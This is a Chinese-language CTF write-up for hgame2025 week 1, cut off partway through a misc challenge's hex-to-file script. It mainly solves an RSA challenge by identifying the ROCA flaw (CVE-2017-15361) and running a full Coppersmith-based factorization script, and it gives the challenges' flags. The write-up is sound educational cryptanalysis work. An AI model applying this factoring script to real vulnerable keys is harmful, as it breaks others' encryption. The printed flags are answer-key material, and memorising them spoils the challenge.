    <content type="html"><![CDATA[<ul><li>hgame2025开打了，趁着寒假有时间，也就顺便打一下了。</li><li>今年的hgame只有两周，并非新生赛了，2024的hgame还有四周，前两周还是偏向新生的，可惜当时没坚持牢下来QAQ。</li></ul><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h2 id="test-nc"><a href="#TEST-NC" class="headerlink" title="TEST NC"></a>TEST NC</h2><ul><li>直接就是测试<code>nc</code>连接</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250206124500125.png" alt="image-20250206124500125"></p><p>flag：<code>hgame&#123;YOUr-c@N_C0NNect-t0_THe_rem0TE_ENv1rOnmeNt-To_g3t-F1Ag0&#125;</code></p><h2 id="从这里开始的序章"><a href="#从这里开始的序章" class="headerlink" title="从这里开始的序章"></a>从这里开始的序章</h2><ul><li>flag在这边</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250206124604520.png" alt="image-20250206124604520"></p><p>flag：<code>hgame&#123;Now-I-kn0w-how-to-subm1t-my-fl4gs!&#125;</code></p><h1 id="crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="suprimersa"><a href="#suprimeRSA" class="headerlink" title="suprimeRSA"></a>suprimeRSA</h2><ul><li>原来的附件出现了非预期，这边也放出来一下</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">FLAG=<span class="string">b&#x27;hgame&#123;xxxxxxxxxxxxxxxxx&#125;&#x27;</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#trick</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorial</span>(<span class="params">num</span>):</span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, num + <span class="number">1</span>):</span><br><span class="line">        result *= i</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> factorial(a)+factorial(b)==a**b</span><br><span class="line"></span><br><span class="line">M=(a+b)&lt;&lt;<span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = getPrime(<span class="number">29</span>)</span><br><span class="line">        a = getPrime(random.randint(<span class="number">20</span>,<span class="number">62</span>))</span><br><span class="line">        p = k * M + <span class="built_in">pow</span>(e, a, M)</span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bin</span>(k))</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bin</span>(a))</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bin</span>(<span class="built_in">pow</span>(e,a,M)))</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bin</span>(k*M))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>,<span class="built_in">bin</span>(p))</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">p,q = gen_key(),gen_key()</span><br><span class="line">n = p*q</span><br><span class="line">m=bytes_to_long(FLAG)</span><br><span class="line">enc=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n=&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;enc=&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e=&#x27;</span>,<span class="built_in">bin</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n=669040758304155675570167824759691921106935750270765997139446851830489844731373721233290816258049</span></span><br><span class="line"><span class="string">enc=487207283176018824965268172307888245763817583875071008869370172565777230514379236733742846575849</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>这边也给出更新后的附件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> prime</span><br><span class="line"></span><br><span class="line">FLAG=<span class="string">b&#x27;hgame&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">primorial</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, num + <span class="number">1</span>):</span><br><span class="line">        result *= prime(i)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">M=primorial(random.choice([<span class="number">39</span>,<span class="number">71</span>,<span class="number">126</span>]))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = getPrime(random.randint(<span class="number">20</span>,<span class="number">40</span>))</span><br><span class="line">        a = getPrime(random.randint(<span class="number">20</span>,<span class="number">60</span>))</span><br><span class="line">        p = k * M + <span class="built_in">pow</span>(e, a, M)</span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">p,q=gen_key(),gen_key()</span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(FLAG)</span><br><span class="line">enc=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n.bit_length())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n=&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;enc=&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n=787190064146025392337631797277972559696758830083248285626115725258876808514690830730702705056550628756290183000265129340257928314614351263713241</span></span><br><span class="line"><span class="string">enc=365164788284364079752299551355267634718233656769290285760796137651769990253028664857272749598268110892426683253579840758552222893644373690398408</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>这边我是先对一开始的附件进行思考，发现可能可以用<code>coppersmith</code>攻击，去打<code>p</code>的低位，之后问了出题人，发现不是<code>coppersmith</code>打p的低位，这时就反复思考。还是往p、q的二进制位去想，也有想到p、q生成的形式问题。</li><li>之后上新附件后，我才确定就是<code>p = k*M + pow(e,a,M)</code>这个素数的生成漏洞，这时就去往这个方向搜素。</li><li>直到搜索到了这篇论文：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Attacks on the RSA Cryptosystem</span><br><span class="line">Notes by Henry Corrigan-Gibbs</span><br><span class="line">MIT - 6.5610</span><br><span class="line">Lecture 14 (March 22, 2023)</span><br></pre></td></tr></table></figure><ul><li>在这篇论文快结束的时候就看到了一个公司的RSA加密bug</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250206130100864.png" alt="image-20250206130100864"></p><ul><li>这个时候就往<code>Infineon</code>这个公司去搜索，这样就搜索到了<code>CVE-2017-15361</code>，同时搜索到了这两篇博客。发现该题就是<code>ROCA</code>攻击</li></ul><p><a href="https://fcrumbling.github.io/2023/09/06/ROCA攻击——CVE-2017-15361/">ROCA攻击——CVE-2017-15361 | crumbling’s secret room</a></p><p><a href="https://bitsdeep.com/posts/analysis-of-the-roca-vulnerability/#introduction">Analysis of the ROCA vulnerability · Bitsdeep</a></p><ul><li>同时发现了这篇论文</li></ul><p><a href="https://crocs.fi.muni.cz/_media/public/papers/nemec_roca_ccs17_preprint.pdf">nemec_roca_ccs17_preprint.pdf</a></p><ul><li>所以就照着学了一遍，之后就直接套脚本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.all_cmdline <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">coppersmith_howgrave_univariate</span>(<span class="params">pol, modulus, beta, mm, tt, XX</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Taken from https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage</span></span><br><span class="line"><span class="string">    Coppersmith revisited by Howgrave-Graham</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * b|modulus, b &gt;= modulus^beta , 0 &lt; beta &lt;= 1</span></span><br><span class="line"><span class="string">    * |x| &lt; XX</span></span><br><span class="line"><span class="string">    More tunable than sage&#x27;s builtin coppersmith method, pol.small_roots()</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># init</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    dd = pol.degree()</span><br><span class="line">    nn = dd * mm + tt</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># checks</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt; beta &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;beta should belongs in [0, 1]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pol.is_monic():</span><br><span class="line">        <span class="keyword">raise</span> ArithmeticError(<span class="string">&quot;Polynomial must be monic.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># calculate bounds and display them</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    * we want to find g(x) such that ||g(xX)|| &lt;= b^m / sqrt(n)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    * we know LLL will give us a short vector v such that:</span></span><br><span class="line"><span class="string">    ||v|| &lt;= 2^((n - 1)/4) * det(L)^(1/n)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    * we will use that vector as a coefficient vector for our g(x)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    * so we want to satisfy:</span></span><br><span class="line"><span class="string">    2^((n - 1)/4) * det(L)^(1/n) &lt; N^(beta*m) / sqrt(n)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    so we can obtain ||v|| &lt; N^(beta*m) / sqrt(n) &lt;= b^m / sqrt(n)</span></span><br><span class="line"><span class="string">    (it&#x27;s important to use N because we might not know b)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Coppersmith revisited algo for univariate</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># change ring of pol and x</span></span><br><span class="line">    polZ = pol.change_ring(ZZ)</span><br><span class="line">    x = polZ.parent().gen()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># compute polynomials</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm):</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(dd):</span><br><span class="line">            gg.append((x * XX) ** jj * modulus ** (mm - ii) * polZ(x * XX) ** ii)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(tt):</span><br><span class="line">        gg.append((x * XX) ** ii * polZ(x * XX) ** mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>):</span><br><span class="line">            BB[ii, jj] = gg[ii][jj]</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform shortest vector in polynomial</span></span><br><span class="line">    new_pol = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        new_pol += x ** ii * BB[<span class="number">0</span>, ii] / XX ** ii</span><br><span class="line"></span><br><span class="line">    <span class="comment"># factor polynomial</span></span><br><span class="line">    potential_roots = new_pol.roots()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># test roots</span></span><br><span class="line">    roots = []</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> potential_roots:</span><br><span class="line">        <span class="keyword">if</span> root[<span class="number">0</span>].is_integer():</span><br><span class="line">            result = polZ(ZZ(root[<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">if</span> gcd(modulus, result) &gt;= modulus ** beta:</span><br><span class="line">                roots.append(ZZ(root[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">M, n, a, m</span>):</span><br><span class="line">    <span class="comment"># I need to import it in the function otherwise multiprocessing doesn&#x27;t find it in its context</span></span><br><span class="line">    <span class="comment"># from sage_functions import coppersmith_howgrave_univariate</span></span><br><span class="line"></span><br><span class="line">    base = <span class="built_in">int</span>(<span class="number">65537</span>)</span><br><span class="line">    <span class="comment"># the known part of p: 65537^a * M^-1 (mod N)</span></span><br><span class="line">    known = <span class="built_in">int</span>(<span class="built_in">pow</span>(base, a, M) * inverse_mod(M, n))</span><br><span class="line">    <span class="comment"># Create the polynom f(x)</span></span><br><span class="line">    F = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>, names=(<span class="string">&#x27;x&#x27;</span>,))</span><br><span class="line">    (x,) = F._first_ngens(<span class="number">1</span>)</span><br><span class="line">    pol = x + known</span><br><span class="line">    beta = <span class="number">0.1</span></span><br><span class="line">    t = m + <span class="number">1</span></span><br><span class="line">    <span class="comment"># Upper bound for the small root x0</span></span><br><span class="line">    XX = floor(<span class="number">2</span> * n**<span class="number">0.5</span> / M)</span><br><span class="line">    <span class="comment"># Find a small root (x0 = k) using Coppersmith&#x27;s algorithm</span></span><br><span class="line">    roots = coppersmith_howgrave_univariate(pol, n, beta, m, t, XX)</span><br><span class="line">    <span class="comment"># There will be no roots for an incorrect guess of a.</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> roots:</span><br><span class="line">        <span class="comment"># reconstruct p from the recovered k</span></span><br><span class="line">        p = <span class="built_in">int</span>(k * M + <span class="built_in">pow</span>(base, a, M))</span><br><span class="line">        <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> p, n // p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">roca</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    keySize = n.bit_length()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> keySize &lt;= <span class="number">960</span>:</span><br><span class="line">        M_prime = <span class="number">0x1b3e6c9433a7735fa5fc479ffe4027e13bea</span></span><br><span class="line">        m = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">992</span> &lt;= keySize &lt;= <span class="number">1952</span>:</span><br><span class="line">        M_prime = <span class="number">0x24683144f41188c2b1d6a217f81f12888e4e6513c43f3f60e72af8bd9728807483425d1e</span></span><br><span class="line">        m = <span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Have you several days/months to spend on this ?&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">1984</span> &lt;= keySize &lt;= <span class="number">3936</span>:</span><br><span class="line">        M_prime = <span class="number">0x16928dc3e47b44daf289a60e80e1fc6bd7648d7ef60d1890f3e0a9455efe0abdb7a748131413cebd2e36a76a355c1b664be462e115ac330f9c13344f8f3d1034a02c23396e6</span></span><br><span class="line">        m = <span class="number">7</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You&#x27;ll change computer before this scripts ends...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">3968</span> &lt;= keySize &lt;= <span class="number">4096</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Just no.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid key size: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(keySize))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    a3 = Zmod(M_prime)(n).log(<span class="number">65537</span>)</span><br><span class="line">    order = Zmod(M_prime)(<span class="number">65537</span>).multiplicative_order()</span><br><span class="line">    inf = a3 // <span class="number">2</span></span><br><span class="line">    sup = (a3 + order) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Search 10 000 values at a time, using single process</span></span><br><span class="line">    chunk_size = <span class="number">10000</span></span><br><span class="line">    <span class="keyword">for</span> inf_a <span class="keyword">in</span> <span class="built_in">range</span>(inf, sup, chunk_size):</span><br><span class="line">        <span class="comment"># create an array with the parameter for the solve function</span></span><br><span class="line">        inputs = [(M_prime, n, a, m) <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(inf_a, inf_a + chunk_size)]</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(inf_a, inf_a + chunk_size):</span><br><span class="line">            result = solve(M_prime, n, a, m)</span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                p, q = result</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;found factorization:\np=<span class="subst">&#123;p&#125;</span>\nq=<span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># For testing, use a sample n value</span></span><br><span class="line">    n = <span class="number">787190064146025392337631797277972559696758830083248285626115725258876808514690830730702705056550628756290183000265129340257928314614351263713241</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting factorization...&quot;</span>)</span><br><span class="line">    <span class="comment">#p,q = roca(n)</span></span><br><span class="line">    p=<span class="number">954455861490902893457047257515590051179337979243488068132318878264162627</span></span><br><span class="line">    q=<span class="number">824752716083066619280674937934149242011126804999047155998788143116757683</span></span><br><span class="line">    enc=<span class="number">365164788284364079752299551355267634718233656769290285760796137651769990253028664857272749598268110892426683253579840758552222893644373690398408</span></span><br><span class="line">    phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    d = gmpy2.invert(e,phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(enc,d,n)</span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;ROCA_ROCK_and_ROll!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>hgame&#123;ROCA_ROCK_and_ROll!&#125;</code></p><h1 id="misc"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="hakuya-want-a-girl-friend"><a href="#Hakuya-Want-A-Girl-Friend" class="headerlink" title="Hakuya Want A Girl Friend"></a>Hakuya Want A Girl Friend</h2><ul><li>打开附件发现是一大堆的十六进制。</li></ul><p><img src="/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/image-20250211102221433.png" alt="image-20250211102221433"></p><ul><li>这可能是某个文件的二进制形式，就将这个文本转换为二进制形式进行输出</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_bytes</span>(<span class="params">hex_str</span>):</span><br><span class="line">    <span class="comment"># 将十六进制字符串转化为字节序列</span></span><br><span class="line">    hex_values = hex_str.split()  <span class="comment"># 按空格分隔</span></span><br><span class="line">    byte_array = <span class="built_in">bytes</span>(<span class="built_in">int</span>(value, <span class="number">16</span>) <span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">reversed</span>(hex_values))  <span class="comment"># 将每个16进制字符串转换为字节</span></span><br><span class="line">    <span class="built_in">print</span>(byte_array)</span><br><span class="line">    <span class="keyword">return</span> byte_array</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_file</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="comment"># 读取输入文件中的16进制数据</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">        hex_str = infile.read().strip()  <span class="comment"># 读取文件并去掉两端的空白符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将16进制字符串转换为字节</span></span><br><span class="line">    byte_data = hex_to_bytes(hex_str)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将字节数据写入输出文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">        outfile.write(byte_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    input_filename = <span class="string">&quot;E:\CTF题目附件\\2025年CTF题目附件\hgame2025\misc\Hakuya Want A Girl Friend.txt&quot;</span>  <span class="comment"># 输入文件路径</span></span><br><span class="line">    output_filename = <span class="string">&quot;output.bin&quot;</span>  <span class="comment"># 输出文件路径</span></span><br><span class="line">    convert_file(input_filename, output_filename)</span><br><span class="line"></span><br><span 